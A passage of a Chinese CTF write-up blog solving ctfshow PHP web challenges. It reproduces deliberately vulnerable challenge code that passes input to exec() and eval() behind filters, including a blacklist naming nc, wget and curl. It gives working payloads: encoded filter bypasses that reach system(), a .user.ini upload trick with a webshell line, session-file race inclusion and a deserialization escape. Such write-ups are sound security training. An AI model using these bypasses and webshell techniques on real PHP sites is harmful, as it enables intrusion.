class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, $x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    check($c);</span><br><span class="line">    exec($c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>感觉是考察命令执行，Linux中可以使用tee命令写文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls &#x2F;|tee file</span><br></pre></td></tr></table></figure><p>返回flag文件名<code>f149_15_h3r3</code></p><p><code>nl /f149_15_h3r3 | tee file</code></p><h3 id="web137">web137</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func($_POST[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>双冒号可以不用实例化一个类的情况下调用类的静态方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#x3D;ctfshow:getFlag</span><br></pre></td></tr></table></figure><h3 id="web138">web138</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strripos($_POST[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;<span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;private function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func($_POST[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>PHP官方文档中的一个例子：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201114213505.png" alt=""></p><p>所以可以使用数组来绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow[0]&#x3D;ctfshow&amp;ctfshow[1]&#x3D;getFlag</span><br></pre></td></tr></table></figure><h3 id="web139">web139</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, $x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    check($c);</span><br><span class="line">    exec($c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相比136这次没有写文件的权限了，但是最开始提到可以sleep，那么就可以用盲注的形式先猜文件名，再猜flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="web140">web140</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    $f1 = (<span class="keyword">String</span>)$_POST[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    $f2 = (<span class="keyword">String</span>)$_POST[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, $f1))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, $f2))&#123;</span><br><span class="line">            $code = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(intval($code) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PHP弱类型比较和函数运用</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201115141244.png" alt=""></p><p>从表中可以发现，0和字符串比较为True，也就是<code>intval($code)</code>需要返回一个0，并且intval会将非数字字符转换为0。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">md5(phpinfo())</span><br><span class="line">md5(sleep())</span><br><span class="line">md5(md5)</span><br><span class="line">usleep(usleep())</span><br></pre></td></tr></table></figure><h3 id="web141">web141</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, $v3))&#123;</span><br><span class="line">            $code =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求v1和v2是数字，v3非字母数字和下划线，并且还要绕过return。</p><p>关于return这个点，PHP中数字是可以和命令进行一些运算的，比如<code>1-phpinfo()</code>是可以成功执行phpinfo语句的。现在还要利用取反或者异或来绕过preg_match。直接上<a href="https://blog.csdn.net/miuzzx/article/details/109143413">羽师傅的脚本</a>，收藏了。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v3&#x3D;-(~%8C%86%8C%8B%9A%92)(~%8b%9e%9c%df%99%d5)-&amp;v2&#x3D;1</span><br></pre></td></tr></table></figure><h3 id="web142">web142</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1))&#123;</span><br><span class="line">        $d = (<span class="keyword">int</span>)($v1 * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span>);</span><br><span class="line">        sleep($d);</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;0</span><br><span class="line">?v1&#x3D;0x0</span><br></pre></td></tr></table></figure><h3 id="web143">web143</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, $v3))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $code =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了±，还可以用*；过滤了~，还可以用异或^</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v3&#x3D;*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%00&quot;^&quot;%7f%60%60%20%60%2a&quot;)?&gt;&amp;v2&#x3D;1</span><br></pre></td></tr></table></figure><h3 id="web144">web144</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; check($v3))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, $v2))&#123;</span><br><span class="line">            $code =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strlen($str)===<span class="number">1</span>?<span class="literal">true</span>:<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>稍微变化一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;(~%8C%86%8C%8B%9A%92)(~%8b%9e%9c%df%99%d5)&amp;v3&#x3D;-</span><br></pre></td></tr></table></figure><h3 id="web145">web145</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, $v3))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $code =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用三目运算符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1&#x3D;1&amp;v3&#x3D;?(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5):&amp;v2&#x3D;1</span><br></pre></td></tr></table></figure><p>太秀了。</p><h2 id="web入门-文件上传">web入门 文件上传</h2><h3 id="web153">web153</h3><p>使用.user.ini解析绕过</p><p>首先上传一个.user.ini文件，内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;01.png</span><br></pre></td></tr></table></figure><p>在上传一个01.png的Webshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#39;..&#x2F;flag.php&#39;); ?&gt;</span><br></pre></td></tr></table></figure><h3 id="web154-155">web154&amp;155</h3><p>忘记了。。。</p><h3 id="Web156">Web156</h3><p>对文件内容进行审查，测试之后发现会拦截关键字php，不过好像可以大小写绕过。但是用了一个骚姿势</p><p>还是上传一个.user.ini，并且更改UA</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201026194340.png" alt=""></p><p>再上传一个webshell</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201026194513.png" alt=""></p><h3 id="web157">web157</h3><p>直接包含.user.ini</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201027131213.png" alt=""></p><h3 id="web158">web158</h3><p>沿用上一个payload</p><h3 id="web159">web159</h3><p>沿用上一个payload</p><h3 id="web160-web161">web160&amp;web161</h3><p>web161好像过滤了关键字log</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201027132110.png" alt=""></p><h3 id="web162">web162</h3><p>折腾了我半天。。包含session文件。</p><p>首先在.user.ini文件中直接包含session文件</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201027200514.png" alt=""></p><p>上传文件条件竞争</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201027200337.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201027200314.png" alt=""></p><h3 id="web163">web163</h3><h2 id="web入门-SQL注入">web入门 SQL注入</h2><h3 id="web171-172">web171&amp;172</h3><p>联合查询注入</p><h3 id="web173">web173</h3><p>联合查询注入/报错注入</p><h2 id="月饼杯">月饼杯</h2><h3 id="web1-此夜圆">web1_此夜圆</h3><p>考点：PHP反序列化字符串逃逸</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1&#x3D;FirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyup&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://xz.aliyun.com/t/6718">https://xz.aliyun.com/t/6718</a></p><h3 id="web2-故人心">web2_故人心</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$a=$_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b=$_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">$c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">$url[<span class="number">1</span>]=$_POST[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric($a) <span class="keyword">and</span> strlen($a)&lt;<span class="number">7</span> <span class="keyword">and</span> $a!=<span class="number">0</span> <span class="keyword">and</span> $a**<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">    $d = ($b==hash(<span class="string">&quot;md2&quot;</span>, $b)) &amp;&amp; ($c==hash(<span class="string">&quot;md2&quot;</span>,hash(<span class="string">&quot;md2&quot;</span>, $c)));</span><br><span class="line">    <span class="keyword">if</span>($d)&#123;</span><br><span class="line">             highlight_file(<span class="string">&#x27;hint.php&#x27;</span>);</span><br><span class="line">             <span class="keyword">if</span>(filter_var($url[<span class="number">1</span>],FILTER_VALIDATE_URL))&#123;</span><br><span class="line">                $host=parse_url($url[<span class="number">1</span>]);</span><br><span class="line">                print_r($host); </span><br><span class="line">                <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow\.com$/&#x27;</span>,$host[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">                    print_r(file_get_contents($url[<span class="number">1</span>]));</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;差点点就成功了！&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;please give me url!!!&#x27;</span>;</span><br><span class="line">            &#125;     </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;想一想md5碰撞原理吧?!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;第一个都过不了还想要flag呀?!&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考察PHP的一些特性，第一关就歇菜了。</p><p>php小数点后超过161位做平方运算时会被截断，但是超过323位又会失效。用科学计数法来代替，即 <code>1e-162 到 1e-323</code>。</p><p>第二关md2弱比较。根据hinthint.txt：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Is it particularly difficult to break MD2?!</span><br><span class="line">I&#39;ll tell you quietly that I saw the payoad of the author.</span><br><span class="line">But the numbers are not clear.have fun~~~~</span><br><span class="line">xxxxx024452    hash(&quot;md2&quot;,$b)</span><br><span class="line">xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))</span><br></pre></td></tr></table></figure><p>用Python跑md2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> MD2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md2</span>(<span class="params">s</span>):</span></span><br><span class="line">    obj = MD2.new()</span><br><span class="line">    obj.update(s.encode())</span><br><span class="line">    <span class="keyword">return</span> obj.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">id</span>):</span></span><br><span class="line">    d = <span 